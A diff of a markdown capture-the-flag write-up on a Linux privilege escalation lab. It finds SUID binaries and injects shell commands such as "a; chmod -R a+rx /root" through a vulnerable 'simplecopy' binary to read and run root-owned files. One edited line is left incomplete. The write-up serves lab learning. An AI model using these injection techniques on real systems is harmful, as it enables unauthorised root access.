@@ -1,7 +1,7 @@
 # Objective 7: Linux PrivEsc
 **Location: Island of Misfit Toys: Ostrich Saloon**  
 
-The objective is to perform a privilege escalation in a Linux terminal session. Finally the binary `/root/runmetoanswer` has to be executed.
+The objective is to perform a privilege escalation in a Linux terminal session. Finally the binary residing in `/root` has to be executed.
 The first approach is to find `suid` files on the file system:
 ```
 elf@745490537a8a:~$ find / -perm -4000 -ls 2>/dev/null
@@ -18,7 +18,7 @@ elf@745490537a8a:~$ find / -perm -4000 -ls 2>/dev/null
 
 `simplecopy`looks promising as this does usually not exist on Linux systems.
 
-Invoking this binary with some test arguments show interesting error messages:
+Invoking this binary with some test arguments show interesting error messages and reveals the :
 ```
 elf@745490537a8a:~$ simplecopy "; ls -l /root" b
 cp: missing file operand
@@ -29,7 +29,7 @@ total 600
 -rws------ 1 root root 612560 Nov 9 21:29 runmetoanswer
 ```
 
-So it seems that it is possible to inject shell commands in the arguments. We use this to add read and execu:
+So it seems that it is possible to inject shell commands in the arguments. We use this to add read and execute permissions to `/root` and `/root/runmetoanswer`:
 ```
 elf@745490537a8a:~$ simplecopy "a; chmod -R a+rx /root" b
 cp: missing destination file operand after 'a'
@@ -51,6 +51,6 @@ Your answer is correct!
 
 **Achievement: Linux PrivEsc**
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE2NTY5OTY0NjgsLTgyNjE3ODY4NCwtMj
-AxMDE5MjYzXX0=
+eyJoaXN0b3J5IjpbLTcxNjQyMTM0OSwtODI2MTc4Njg0LC0yMD
+EwMTkyNjNdfQ==
 -->
